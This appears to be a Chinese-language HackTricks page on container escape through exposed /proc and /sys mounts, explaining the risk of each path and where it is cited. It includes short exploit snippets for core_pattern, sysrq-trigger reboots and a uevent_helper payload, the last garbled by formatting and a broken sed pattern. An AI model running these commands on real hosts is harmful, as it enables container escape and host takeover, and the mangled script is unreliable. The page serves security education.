# 敏感挂载

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

暴露 `/proc` 和 `/sys` 而没有适当的命名空间隔离会引入重大安全风险，包括攻击面扩大和信息泄露。这些目录包含敏感文件，如果配置错误或被未经授权的用户访问，可能导致容器逃逸、主机修改或提供有助于进一步攻击的信息。例如，错误地挂载 `-v /proc:/host/proc` 可能会由于其基于路径的特性绕过 AppArmor 保护，使得 `/host/proc` 没有保护。

**您可以在** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** 中找到每个潜在漏洞的更多详细信息。**

## procfs 漏洞

### `/proc/sys`

该目录允许访问以修改内核变量，通常通过 `sysctl(2)`，并包含几个关注的子目录：

#### **`/proc/sys/kernel/core_pattern`**

* 在 [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) 中描述。
* 允许定义在生成核心文件时执行的程序，前 128 字节作为参数。如果文件以管道 `|` 开头，可能导致代码执行。
*   **测试和利用示例**：

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 测试写入权限
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # 设置自定义处理程序
sleep 5 && ./crash & # 触发处理程序
```

#### **`/proc/sys/kernel/modprobe`**

* 在 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) 中详细说明。
* 包含内核模块加载器的路径，用于加载内核模块。
*   **检查访问示例**：

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # 检查对 modprobe 的访问
```

#### **`/proc/sys/vm/panic_on_oom`**

* 在 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) 中引用。
* 一个全局标志，控制内核在发生 OOM 条件时是否崩溃或调用 OOM 杀手。

#### **`/proc/sys/fs`**

* 根据 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)，包含有关文件系统的选项和信息。
* 写入权限可能会启用针对主机的各种拒绝服务攻击。

#### **`/proc/sys/fs/binfmt_misc`**

* 允许根据其魔术数字注册非本地二进制格式的解释器。
* 如果 `/proc/sys/fs/binfmt_misc/register` 可写，可能导致特权提升或 root shell 访问。
* 相关利用和解释：
* [通过 binfmt\_misc 的穷人根套件](https://github.com/toffan/binfmt\_misc)
* 深入教程：[视频链接](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### `/proc` 中的其他内容

#### **`/proc/config.gz`**

* 如果启用了 `CONFIG_IKCONFIG_PROC`，可能会泄露内核配置。
* 对攻击者识别运行内核中的漏洞非常有用。

#### **`/proc/sysrq-trigger`**

* 允许调用 Sysrq 命令，可能导致立即重启系统或其他关键操作。
*   **重启主机示例**：

```bash
echo b > /proc/sysrq-trigger # 重启主机
```

#### **`/proc/kmsg`**

* 暴露内核环形缓冲区消息。
* 可以帮助内核利用、地址泄露，并提供敏感系统信息。

#### **`/proc/kallsyms`**

* 列出内核导出符号及其地址。
* 对于内核利用开发至关重要，尤其是在克服 KASLR 时。
* 地址信息在 `kptr_restrict` 设置为 `1` 或 `2` 时受到限制。
* 详细信息见 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。

#### **`/proc/[pid]/mem`**

* 与内核内存设备 `/dev/mem` 交互。
* 历史上容易受到特权提升攻击。
* 更多信息见 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。

#### **`/proc/kcore`**

* 以 ELF 核心格式表示系统的物理内存。
* 读取可能会泄露主机系统和其他容器的内存内容。
* 大文件大小可能导致读取问题或软件崩溃。
* 详细用法见 [2019 年转储 /proc/kcore](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)。

#### **`/proc/kmem`**

* `/dev/kmem` 的替代接口，表示内核虚拟内存。
* 允许读取和写入，因此可以直接修改内核内存。

#### **`/proc/mem`**

* `/dev/mem` 的替代接口，表示物理内存。
* 允许读取和写入，修改所有内存需要解析虚拟地址到物理地址。

#### **`/proc/sched_debug`**

* 返回进程调度信息，绕过 PID 命名空间保护。
* 暴露进程名称、ID 和 cgroup 标识符。

#### **`/proc/[pid]/mountinfo`**

* 提供有关进程挂载命名空间中挂载点的信息。
* 暴露容器 `rootfs` 或镜像的位置。

### `/sys` 漏洞

#### **`/sys/kernel/uevent_helper`**

* 用于处理内核设备 `uevents`。
* 写入 `/sys/kernel/uevent_helper` 可以在 `uevent` 触发时执行任意脚本。
*   **利用示例**： %%%bash

#### 创建有效载荷

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### 从 OverlayFS 挂载中查找主机路径

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### 将 uevent\_helper 设置为恶意助手

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### 触发 uevent

echo change > /sys/class/mem/null/uevent

#### 读取输出

cat /output %%%

#### **`/sys/class/thermal`**

* 控制温度设置，可能导致 DoS 攻击或物理损坏。

#### **`/sys/kernel/vmcoreinfo`**

* 泄露内核地址，可能危及 KASLR。

#### **`/sys/kernel/security`**

* 存放 `securityfs` 接口，允许配置 Linux 安全模块，如 AppArmor。
* 访问可能使容器能够禁用其 MAC 系统。

#### **`/sys/firmware/efi/vars` 和 `/sys/firmware/efi/efivars`**

* 暴露与 NVRAM 中 EFI 变量交互的接口。
* 配置错误或利用可能导致笔记本电脑砖化或主机无法启动。

#### **`/sys/kernel/debug`**

* `debugfs` 提供了一个“无规则”的内核调试接口。
* 由于其不受限制的特性，历史上存在安全问题。

### 参考文献

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [理解和强化 Linux 容器](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [滥用特权和非特权 Linux 容器](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
